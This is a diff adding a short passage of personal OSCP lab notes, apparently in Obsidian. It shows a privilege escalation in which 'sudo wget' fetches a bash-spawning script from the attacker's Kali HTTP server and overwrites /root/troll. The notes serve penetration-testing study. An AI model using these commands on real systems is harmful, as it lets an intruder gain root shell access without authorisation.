@@ -123,3 +123,29 @@ root
 
 ---
 
+/usr/bin/wget
+
+```
+vim writeup.sh
+```
+
+```
+#!/bin/bash
+
+bash
+```
+
+On kali machine
+```
+python3 -m http.server 8080
+```
+
+On Target machine
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `sudo wget ${KaliIP}:8080/writeup.sh -O /root/troll`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
